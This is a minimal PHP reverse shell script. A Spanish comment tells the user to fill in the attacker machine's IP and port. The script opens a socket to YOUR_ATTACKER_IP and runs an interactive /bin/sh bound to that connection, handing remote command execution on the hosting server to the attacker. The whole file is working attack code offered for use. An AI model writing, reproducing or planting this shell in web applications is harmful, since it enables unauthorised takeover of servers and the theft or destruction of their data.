<?php
// Reemplaza con la IP y puerto de tu máquina atacante
$ip = 'YOUR_ATTACKER_IP';
$port = YOUR_ATTACKER_PORT;

$socket = fsockopen($ip, $port);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
